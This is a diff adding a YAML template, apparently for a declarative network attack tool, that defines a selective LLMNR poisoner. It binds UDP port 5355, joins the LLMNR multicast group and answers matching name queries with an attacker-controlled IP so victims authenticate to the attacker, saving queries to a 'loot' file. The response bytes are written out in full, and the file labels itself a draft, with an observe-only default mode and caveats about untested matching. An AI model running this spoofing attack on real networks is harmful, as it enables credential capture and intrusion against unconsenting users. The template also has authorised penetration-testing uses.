@@ -1,0 +1,59 @@
+id: llmnr-poison
+info:
+  name: LLMNR poisoner (DRAFT - validate before use)
+  author: crafty
+  severity: high
+  tags: [listener, udp, llmnr, multicast, poisoning]
+  description: >
+    Selective LLMNR poisoner. Binds UDP/5355, joins the LLMNR multicast group
+    224.0.0.252, and for in-scope queries answers with ATTACKER_IP so the victim
+    authenticates to you.
+
+    STATUS: DRAFT. The RESPONSE bytes below are built with the DSL and are
+    structurally correct LLMNR (echo transaction id + question, answer RR with an
+    A record). What is NOT yet reproduced against a live LLMNR client, and what you
+    must validate before relying on this, is (a) precise name-based selectivity -
+    DNS label parsing needs the deferred `script` step or a future `dns_name`
+    helper, so selectivity here matches against the raw packet bytes, and (b) edge
+    cases where the query carries an OPT/additional record (then `data[12:]` is not
+    exactly the question). This template is the honest illustration of where the
+    declarative DSL's edge is and the script step begins.
+
+transport: udp
+role: listener
+mode: analyze                # SAFE DEFAULT: observe only. Set mode=active to poison.
+
+defaults:
+  ATTACKER_IP: "127.0.0.1"
+
+socket:
+  bind: "0.0.0.0:5355"
+  options: [SO_REUSEADDR]
+  multicast:
+    group: "224.0.0.252"
+    interface: "{{IFACE|0.0.0.0}}"   # an IP address in v0, not a device name
+
+selectivity:
+  respond_to: ["*corp*"]             # matched against raw packet bytes (see DRAFT note)
+  ignore: ["*canary*", "*wpad*"]
+  max_responses_per_host: 5
+  cooldown: 10s
+
+on_receive:
+  respond:
+    bytes: >
+      {{= concat(
+        data[0:2],
+        hex2b('8000'),
+        hex2b('00010001'),
+        hex2b('00000000'),
+        data[12:],
+        hex2b('C00C'),
+        hex2b('00010001'),
+        u32be(30),
+        u16be(4),
+        ip4(ATTACKER_IP)
+      )}}
+  capture:
+    to: "loot/llmnr-queries.txt"
+    value: "query bytes from {{peer}}"
